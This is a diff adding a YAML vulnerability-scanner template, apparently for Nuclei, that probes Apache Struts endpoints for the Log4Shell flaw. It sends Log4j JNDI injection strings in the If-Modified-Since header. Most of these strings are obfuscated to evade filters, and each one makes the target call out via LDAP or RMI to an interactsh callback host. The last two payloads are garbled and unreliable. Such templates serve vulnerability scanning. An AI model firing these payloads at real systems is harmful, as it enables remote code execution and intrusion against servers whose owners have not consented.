@@ -1,0 +1,63 @@
+id: log4j-fuzz-head-poc
+
+info:
+  name: log4j-rce-structs2
+  author: dr34d
+  severity: critical
+  tags: apache,rce
+
+requests:
+  - raw:
+      - |
+        GET /static/c380bded4bbe1fda2cda6096c56577ad.js HTTP/1.1
+        Host: {{Hostname}}
+        {{log4j_payloads}}
+
+      - |
+        GET /struts/c380bded4bbe1fda2cda6096c56577ad.js HTTP/1.1
+        Host: {{Hostname}}
+        {{log4j_payloads}}
+
+      - |
+        POST /static/c380bded4bbe1fda2cda6096c56577ad.js HTTP/1.1
+        Host: {{Hostname}}
+        {{log4j_payloads}}
+
+      - |
+        POST /struts/c380bded4bbe1fda2cda6096c56577ad.js HTTP/1.1
+        Host: {{Hostname}}
+        {{log4j_payloads}}
+
+    payloads:
+      log4j_payloads:
+        - 'If-Modified-Since: ${jndi:ldap://{{interactsh-url}}/info}'
+        - 'If-Modified-Since:${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{interactsh-url}}/poc}'
+        - 'If-Modified-Since:${${::-j}ndi:rmi://{{interactsh-url}}/ass}'
+        - 'If-Modified-Since:${jndi:rmi://{{interactsh-url}}}'
+        - 'If-Modified-Since:${${lower:jndi}:${lower:rmi}://{{interactsh-url}}/poc}'
+        - 'If-Modified-Since:${${lower:${lower:jndi}}:${lower:rmi}://{{interactsh-url}}/poc}'
+        - 'If-Modified-Since:${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{interactsh-url}}/poc}'
+        - 'If-Modified-Since:${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{interactsh-url}}/poc}'
+        - 'If-Modified-Since:${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{interactsh-url}}/poc}'
+        - 'If-Modified-Since:${${::-j}ndi:rmi://{{interactsh-url}}/ass}'
+        - 'If-Modified-Since:${jndi:rmi://{{interactsh-url}}}'
+        - 'If-Modified-Since:${${lower:jndi}:${lower:rmi}://{{interactsh-url}}/poc}'
+        - 'If-Modified-Since:${${lower:${lower:jndi}}:${lower:rmi}://{{interactsh-url}}/poc}'
+        - 'If-Modified-Since:${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{interactsh-url}}/poc}'
+        - 'If-Modified-Since:${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{interactsh-url}}/poc}'
+        - 'If-Modified-Sinceldap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Type//{{interactsh-url}}/info}'
+        - 'If-Modified-Sinceldap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Type//{{interactsh-url}}/info}'
+    attack: clusterbomb
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: http
+        words:
+          - "http"
+
+      - type: word
+        part: interactsh_protocol
+        name: dns
+        words:
+          - "dns"
